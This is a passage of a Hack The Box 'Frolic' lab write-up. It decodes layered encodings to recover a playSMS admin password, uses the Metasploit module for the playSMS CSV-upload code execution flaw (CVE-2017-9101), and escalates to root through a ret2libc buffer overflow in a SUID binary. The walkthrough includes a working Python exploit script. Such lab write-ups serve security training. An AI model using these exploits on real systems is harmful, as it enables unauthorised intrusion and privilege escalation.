<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a

</code></pre></div></div>
<p><br><img src="/images/hackthebox/frolic/22.png" alt="" class="align-center"><br><br>
Hex encoded , let’s decode it. I will use a website called <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreferrer">CyberChef</a> :
<br><img src="/images/hackthebox/frolic/23.png" alt="" class="align-center"><br><br>
Base64 encoded output , let’s decode one more time :
<br><img src="/images/hackthebox/frolic/24.png" alt="" class="align-center"><br><br>
Another esoteric language. But this time it’s a famous one , <code class="language-plaintext highlighter-rouge">brainfuck</code>. We will use <a href="https://www.dcode.fr/" target="_blank" rel="noopener noreferrer">dcode.fr</a> again :
<br><img src="/images/hackthebox/frolic/25.png" alt="" class="align-center"><br><br>
Output :
<code class="language-plaintext highlighter-rouge">idkwhatispass</code>
<br><img src="/images/hackthebox/frolic/26.png" alt="" class="align-center"><br><br>
Let’s try to login to playsms as admin with this password :
<br><img src="/images/hackthebox/frolic/27.png" alt="" class="align-center"><br><br>
And it worked.<br></p>

<h2 id="exploiting-authenticated-rce-and-getting-user">Exploiting Authenticated RCE and getting user</h2>
<p>There are some known vulnerabilities for playsms , one of them is an Authenticated CSV File Upload Code Execution (CVE-2017-9101). There’s also a <a href="https://www.rapid7.com/db/modules/exploit/multi/http/playsms_uploadcsv_exec" target="_blank" rel="noopener noreferrer">metasploit module</a> for it.<br>
<br><img src="/images/hackthebox/frolic/28.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/frolic/29.png" alt="" class="align-center"><br><br>
The exploit worked and we have a meterpreter session now :
<br><img src="/images/hackthebox/frolic/30.png" alt="" class="align-center"><br><br>
We owned user !</p>

<h2 id="buffer-overflow-in-rop">Buffer Overflow in rop</h2>
<p>In the home directory of the user <code class="language-plaintext highlighter-rouge">ayush</code> there’s a directory called <code class="language-plaintext highlighter-rouge">.binary</code> , which has a binary called <code class="language-plaintext highlighter-rouge">rop</code>. we can verify that <code class="language-plaintext highlighter-rouge">rop</code> is <code class="language-plaintext highlighter-rouge">suid</code> by using <code class="language-plaintext highlighter-rouge">find</code>:
<code class="language-plaintext highlighter-rouge">find /home/ayush/.binary/ -perm -4000</code>
<br><img src="/images/hackthebox/frolic/32.png" alt="" class="align-center"><br><br>
Let’s see what is it doing :
<br><img src="/images/hackthebox/frolic/33.png" alt="" class="align-center"><br><br>
So it takes our input and just ouputs it , Let’s try giving it a long string :
<br><img src="/images/hackthebox/frolic/34.png" alt="" class="align-center"><br><br>
We got a segmentation fault , so we have a buffer overflow. I will go through the exploitation without explaining everything because I have already written some posts about buffer overflow. You can check them <a href="/categories/#binary-exploitation">here</a>
We are going to do a ret2libc attack , if you are unfamiliar with it , you can read my post about it <a href="/binary-exploitation/bof6/">here</a>
First of all , <code class="language-plaintext highlighter-rouge">gdb</code> is not installed on the box :
<br><img src="/images/hackthebox/frolic/35.png" alt="" class="align-center"><br><br>
So I download a static version of <code class="language-plaintext highlighter-rouge">gdb</code> from <a href="https://github.com/hugsy/gdb-static/blob/master/gdb-7.10.1-x32" target="_blank" rel="noopener noreferrer">github</a> , and uploaded it to the box through the meterpreter session. <code class="language-plaintext highlighter-rouge">upload gdb</code>
Let’s find the length of the buffer :
<br><img src="/images/hackthebox/frolic/36.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/frolic/37.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/frolic/38.png" alt="" class="align-center"><br><br>
So the buffer overflows after 52 chars. Now we need to know the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> , I won’t do it like I did before by loading the string in a environment variable. There’s a better way to do it, first thing we need to find the offset of <code class="language-plaintext highlighter-rouge">/bin/sh</code> in <code class="language-plaintext highlighter-rouge">libc</code> , we will use <code class="language-plaintext highlighter-rouge">strings</code> to get the address :
<code class="language-plaintext highlighter-rouge">strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh</code>
<br><img src="/images/hackthebox/frolic/39.png" alt="" class="align-center"><br><br>
Offset : <code class="language-plaintext highlighter-rouge">0x0015ba0b</code>
Then we need the address of <code class="language-plaintext highlighter-rouge">libc</code> , we can use <code class="language-plaintext highlighter-rouge">ldd</code> to get it :
<code class="language-plaintext highlighter-rouge">ldd rop</code>
<br><img src="/images/hackthebox/frolic/40.png" alt="" class="align-center"><br><br>
Address : <code class="language-plaintext highlighter-rouge">0xb7e19000</code>
Then we will add the two addresses to get the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code>
Address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> : <code class="language-plaintext highlighter-rouge">0x0015ba0b</code> + <code class="language-plaintext highlighter-rouge">0xb7e19000</code> = <code class="language-plaintext highlighter-rouge">0xb7f74a0b</code>
Now we need the addresses of <code class="language-plaintext highlighter-rouge">system()</code> and <code class="language-plaintext highlighter-rouge">exit()</code> :
<br><img src="/images/hackthebox/frolic/41.png" alt="" class="align-center"><br><br>
Address of <code class="language-plaintext highlighter-rouge">system()</code> : <code class="language-plaintext highlighter-rouge">0xb7e53da0</code>
Address of <code class="language-plaintext highlighter-rouge">exit()</code> : <code class="language-plaintext highlighter-rouge">0xb7e479d0</code>
Our final exploit will be:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/python

import struct

buf = "A" * 52
system = struct.pack("I" ,0xb7e53da0)
exit = struct.pack("I" ,0xb7e479d0)
shell = struct.pack("I" ,0xb7f74a0b)
print buf + system + exit + shell
</code></pre></div></div>
<p><br><img src="/images/hackthebox/frolic/42.png" alt="" class="align-center"><br><br>
Let’s upload and run it :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./rop `python /tmp/exploit.py`
</code></pre></div></div>
<p><br><img src="/images/hackthebox/frolic/43.png" alt="" class="align-center"><br><br>
And we owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/carrier/">Hack The Box - Carrier</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/curling/">Hack The Box - Curling</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-03-23T07:00:00+02:00">March 23, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/curling/" class="pagination--pager" title="Hack The Box - Curling
">Previous</a>
    
    
      <a href="/wizard-labs/devlife/" class="pagination--pager" title="Wizard Labs - Devlife
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
